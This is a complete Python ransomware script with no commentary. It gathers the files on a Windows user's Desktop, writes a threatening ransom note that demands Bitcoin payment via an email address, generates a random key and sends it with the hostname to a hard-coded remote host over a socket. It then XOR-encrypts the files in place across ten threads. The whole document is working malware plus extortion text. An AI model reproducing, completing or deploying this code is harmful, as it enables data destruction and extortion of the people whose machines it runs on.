import socket
import os
import threading
import queue
import random

# Encryption function that threads will run
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                # increment key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} successfully encrypted')
        except:
            print('Failed to encrypt file')
        q.task_done()

# socket information
IP_ADDRESS = '192.168.1.162'
PORT = 1234

# Encryption information
ENCRYPTION_LEVEL = 512 // 8       # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;{}|'
key_char_pool_len = len(key_char_pool)

# Grap filepaths to encrypt
print("Preparing files...")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("successfully located all files!!")

with open('RANSOM_NOTE.txt', 'w') as f:
    f.write(f'''
The hard disks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')

# Grab clients hostname
hostname = os.getenv('COMPUTERNAME')

# Generate encryption key
print("Generation encryption key...")
key = ''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]
print("Key Generated !!!")

# connect to server to transfer key and host name
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print('Successfully connected ... transmitting hostname and key')
    s.send(f'{hostname} : {key}'.encode('latin-1'))
    print('Finished transmitting data!')
    s.close()

# Store files into a queue for threads to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)

# setup threads to get ready for encryption
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Encryption and upload complete!!! ')
input()
